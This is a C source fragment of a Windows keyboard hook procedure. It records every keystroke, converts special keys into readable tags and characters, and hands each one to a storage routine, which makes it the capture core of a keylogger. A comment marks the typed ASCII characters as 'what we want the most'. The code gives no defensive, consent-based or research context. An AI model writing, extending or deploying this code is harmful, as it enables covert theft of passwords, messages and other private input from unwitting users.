LRESULT CALLBACK KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if(!(lParam >> 31) && (code >= 0))
	{
		char keyw[20];
		switch(wParam)
		{
			case VK_CANCEL:    strcpy(keyw,"[CTRL-BRK]"); break;
			case VK_BACK:      strcpy(keyw,"[BACK]"); break;
			case VK_TAB:       strcpy(keyw,"[TAB]"); break;
			case VK_CLEAR:     strcpy(keyw,"[CLEAR]"); break;
			case VK_RETURN:    strcpy(keyw,"[ENTER]\r\n"); break;
			case VK_SHIFT:     strcpy(keyw,"[SHIFT]"); break;
			case VK_CONTROL:   strcpy(keyw,"[CTRL]"); break;
			case VK_MENU:      strcpy(keyw,"[ALT]"); break;
			case VK_PAUSE:     strcpy(keyw,"[PAUSE]"); break;
			case VK_CAPITAL:   strcpy(keyw,"[CapsLock]"); break;
			case VK_ESCAPE:    strcpy(keyw,"[ESC]"); break;
			case VK_PRIOR:     strcpy(keyw,"[PageUp]"); break;
			case VK_NEXT:      strcpy(keyw,"[PageDown]"); break;
			case VK_END:       strcpy(keyw,"[END]"); break;
			case VK_HOME:      strcpy(keyw,"[HOME]"); break;
			case VK_LEFT:      strcpy(keyw,"[LEFT]"); break;
			case VK_UP:        strcpy(keyw,"[UP]"); break;
			case VK_RIGHT:     strcpy(keyw,"[RIGHT]"); break;
			case VK_DOWN:      strcpy(keyw,"[DOWN]"); break;
			case VK_SELECT:    strcpy(keyw,"[SELECT]"); break;
			case VK_EXECUTE:   strcpy(keyw,"[EXECUTE]"); break;
			case VK_SNAPSHOT:  strcpy(keyw,"[PrintScreen]"); break;
			case VK_INSERT:    strcpy(keyw,"[INSERT]"); break;
			case VK_DELETE:    strcpy(keyw,"[DELETE]"); break;
			case VK_HELP:      strcpy(keyw,"[HELP]"); break;
			case VK_LWIN:      strcpy(keyw,"[LeftWindowsKey]"); break;
			case VK_RWIN:      strcpy(keyw,"[RightWindowsKey]"); break;
			case VK_APPS:      strcpy(keyw,"[ApplicationKey]"); break;
			case VK_MULTIPLY:  strcpy(keyw,"[MULTIPLY]"); break;
			case VK_ADD:       strcpy(keyw,"[ADD]"); break;
			case VK_SEPARATOR: strcpy(keyw,"[SEPERATOR]"); break;
			case VK_SUBTRACT:  strcpy(keyw,"[SUBTRACT]"); break;
			case VK_DECIMAL:   strcpy(keyw,"[DECIMAL]"); break;
			case VK_DIVIDE:    strcpy(keyw,"[DIVIDE]"); break;
			case VK_NUMLOCK:   strcpy(keyw,"[NumLock]"); break;
			case VK_SCROLL:    strcpy(keyw,"[ScrollLock]"); break;
			case VK_ATTN:      strcpy(keyw,"[ATTN]"); break;
			case VK_CRSEL:     strcpy(keyw,"[CrSel]"); break;
			case VK_EXSEL:     strcpy(keyw,"[ExSel]"); break;
			case VK_EREOF:     strcpy(keyw,"[EraseEOF]"); break;
			case VK_PLAY:      strcpy(keyw,"[PLAY]"); break;
			case VK_ZOOM:      strcpy(keyw,"[ZOOM]"); break;
			default: {
				/* function keys */
				if((wParam >= VK_F1)
				 &&(wParam <= VK_F24))
				{
					sprintf(keyw,"[F%u]",
					(wParam - VK_F1 + 1));
				}
				/* what we want the most... the ASCII keys */
				else if ((wParam==VK_SPACE)||(wParam>=0x2f)&&(wParam<=0x100)) 
				{
					BYTE ks[256];
					GetKeyboardState(ks);
					WORD w;
					UINT scan=0;
					ToAscii(wParam,scan,ks,&w,0);
					*keyw = char(w);
					keyw[1] = '\0';
				}
				else {
					sprintf(keyw,"[(%d)%c]",wParam,wParam); break;
				}
			}
		}
		STORE_INFO(keyw);
	}
	return CallNextHookEx(KeyHook, code, wParam, lParam);
}